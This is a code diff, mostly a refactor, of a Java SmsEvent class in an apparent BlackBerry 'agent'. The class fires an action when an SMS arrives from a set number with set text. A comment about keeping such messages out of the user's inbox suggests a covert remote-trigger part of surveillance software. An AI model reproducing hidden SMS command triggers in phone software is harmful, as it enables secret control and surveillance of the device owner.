@@ -20,12 +20,11 @@ import javax.wireless.messaging.MessageListener;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.device.api.util.DataBuffer;
-import blackberry.agent.sms.SmsListener;
+import blackberry.agent.sms.SmsListener45;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
 import blackberry.utils.WChar;
-
 
 /**
  * To prevent this message from appearing in the BlackBerry device user’s inbox,
@@ -41,15 +40,16 @@ import blackberry.utils.WChar;
  * 
  * @author user1
  */
-public final class SmsEvent extends Event implements MessageListener, SmsObserver {
+public final class SmsEvent extends Event implements MessageListener,
+        SmsObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
     //#endif
 
     String number;
     String text;
-    
-    SmsListener smsListener;
+
+    SmsListener45 smsListener;
 
     // private final boolean stop = false;
     private DatagramConnection dc;
@@ -66,14 +66,13 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
     public SmsEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
         setPeriod(NEVER);
-        
-        smsListener = SmsListener.getInstance();
+
+        smsListener = SmsListener45.getInstance();
     }
 
     protected void actualStart() {
         smsListener.addSmsObserver(this);
     }
-
 
     protected void actualRun() {
         //#ifdef DEBUG
@@ -89,7 +88,7 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
         //#ifdef DEBUG
         debug.trace("actualStop");
         //#endif
-      
+
         smsListener.removeSmsObserver(this);
     }
 
@@ -109,21 +108,22 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
             if (m instanceof TextMessage) {
                 final TextMessage tm = (TextMessage) m;
                 msg = tm.getPayloadText();
-                
-                if(address.endsWith(number)){
+
+                if (address.endsWith(number)) {
                     //#ifdef DEBUG
-                    debug.trace("notifyIncomingMessage: good number "+address);
+                    debug.trace("notifyIncomingMessage: good number " + address);
                     //#endif
-                    
-                    if( text == null || msg.equals(text) ){
+
+                    if (text == null || msg.equals(text)) {
                         //#ifdef DEBUG
-                        debug.trace("notifyIncomingMessage good message: " + msg);
+                        debug.trace("notifyIncomingMessage good message: "
+                                + msg);
                         //#endif
-                        
+
                         trigger();
                     }
                 }
-                
+
             } else if (m instanceof BinaryMessage) {
                 //final StringBuffer buf = new StringBuffer();
                 final byte[] data = ((BinaryMessage) m).getPayloadData();
@@ -166,7 +166,7 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
             byte[] textW = new byte[textLen];
             databuffer.read(textW);
 
-            if(textLen > 0 ){
+            if (textLen > 0) {
                 //#ifdef DEBUG
                 debug.trace("parse: we have a text");
                 //#endif
@@ -185,39 +185,27 @@ public final class SmsEvent extends Event implements MessageListener, SmsObserve
         return true;
     }
 
-    public void onNewSms(Message m, boolean incoming) {
-        final String address = m.getAddress();
+    public void onNewSms(byte[] dataMsg, String address, boolean incoming) {
+
         String msg = null;
-        if (m instanceof TextMessage) {
-            final TextMessage tm = (TextMessage) m;
-            msg = tm.getPayloadText().toLowerCase();
-            
-            if(incoming && address.endsWith(number)){
-                //#ifdef DEBUG
-                debug.trace("notifyIncomingMessage: good number "+address);
-                //#endif
-                
-                // case insensitive
-                if( text == null || msg.startsWith(text)){
-                    //#ifdef DEBUG
-                    debug.trace("notifyIncomingMessage good message: " + msg);
-                    //#endif
-                    
-                    trigger();
-                }
-            }
-            
-        } else if (m instanceof BinaryMessage) {
+
+        msg = (new String(dataMsg)).toLowerCase();
+
+        if (incoming && address.endsWith(number)) {
             //#ifdef DEBUG
-            debug.trace("onNewSms: Binary");
+            debug.trace("notifyIncomingMessage: good number " + address);
             //#endif
-        } else {
-          //#ifdef DEBUG
-            debug.trace("onNewSms: unknown");
-            //#endif
+
+            // case insensitive
+            if (text == null || msg.startsWith(text)) {
+                //#ifdef DEBUG
+                debug.trace("notifyIncomingMessage good message: " + msg);
+                //#endif
+
+                trigger();
+            }
         }
+
     }
-    
-    
 
 }
